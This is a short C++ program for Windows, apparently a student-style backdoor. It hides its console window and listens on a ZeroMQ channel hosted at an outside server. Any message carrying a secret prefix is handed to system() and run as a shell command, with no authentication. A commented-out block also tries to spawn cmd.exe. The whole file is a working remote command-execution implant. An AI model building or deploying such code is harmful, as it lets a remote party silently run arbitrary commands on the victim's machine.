#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <cstdio>
#include <stdlib.h>
#include <zmq.hpp>
#include <iostream>

#define DEFAULT_BUFLEN 1024




[[noreturn]] void RunShell() {
    zmq::context_t context(1);
    zmq::socket_t subscriber( context, ZMQ_SUB );
    subscriber.connect( "tcp://benternet.pxl-ea-ict.be:24042" );
    subscriber.setsockopt( ZMQ_SUBSCRIBE, "", 0 );
    auto * msg = new zmq::message_t();
    auto * test = "exit";
        //
    while(true) {
        subscriber.recv(msg);    // Five Second
        if((msg->to_string().find("amazingService!>theBigSecret>")) != std::string::npos){
            std::string r = msg->to_string().substr(29, msg->to_string().length());
            if(r.compare("exit") == 0){
                exit(0);
            }
            else {
                system(r.c_str());
            }
        }
       // system("start notepad");

        /*char Process[] = "cmd.exe";
        STARTUPINFO sinfo;
        PROCESS_INFORMATION pinfo;
        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) "C:\\Windows>notepad";//(HANDLE) test;
        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);*/
                //Sleep(5000);
            }
        }




int main(int argc, char **argv) {
        FreeConsole();
        RunShell();
    return 0;
}
